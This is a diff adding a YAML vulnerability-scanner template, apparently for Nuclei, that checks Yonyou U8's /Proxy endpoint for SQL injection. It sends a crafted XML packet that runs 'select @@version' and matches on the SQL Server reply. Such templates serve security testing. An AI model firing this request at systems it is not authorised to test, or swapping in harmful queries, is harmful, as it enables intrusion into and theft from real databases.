@@ -1,0 +1,29 @@
+id: yongyouU8_Proxy_sql
+
+info:
+  name: yongyouU8_Proxy_sql
+  author: sm
+  severity: critical
+  tags: yongyouU8
+
+http:
+  - raw:
+      - |              
+        POST /Proxy HTTP/1.1
+        Accept: *
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64)
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded
+        Content-Length: 349
+        Connection: close
+
+        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
+
+
+               
+    matchers:
+      - type: word
+        words:
+          - "DATAPACKET Version"
+          - "Microsoft SQL Server"
+        condition: and
